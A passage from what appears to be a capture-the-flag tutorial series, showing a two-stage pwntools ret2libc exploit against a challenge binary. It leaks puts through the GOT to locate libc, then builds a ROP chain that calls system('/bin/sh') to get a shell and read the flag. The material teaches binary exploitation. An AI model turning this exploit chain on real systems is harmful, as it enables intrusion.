ROP a call to puts(puts@got) to print libc's resolved puts address, then return into main to run the vulnerable path a second time with libc located.

from pwn import *
elf  = ELF("./chall"); libc = ELF("./libc.so.6")
p = elf.process()
rop = ROP(elf)

payload  = b"A"*72
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got['puts'])      # arg = &puts@GOT
payload += p64(elf.plt['puts'])      # leak it
payload += p64(elf.sym['main'])      # round two
p.sendlineafter(b'> ', payload)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.success('libc base: %#x', libc.address)

Stage 2 — pop a shell

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]          # movaps alignment

payload  = b"A"*72
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)
payload += p64(libc.sym['system'])
p.sendlineafter(b'> ', payload)
p.interactive()                                # $ id; cat flag.txt -> flag{...}

Every piece here appeared in an earlier post — the cyclic offset, the leak-then-exploit structure, the pop rdi gadget, the movaps alignment ret. That is the entire point of the series: real exploits are these fundamentals, composed. Learn each one in isolation on a toy binary, then chain them, and a "hard" pwn challenge becomes a sequence of familiar moves.
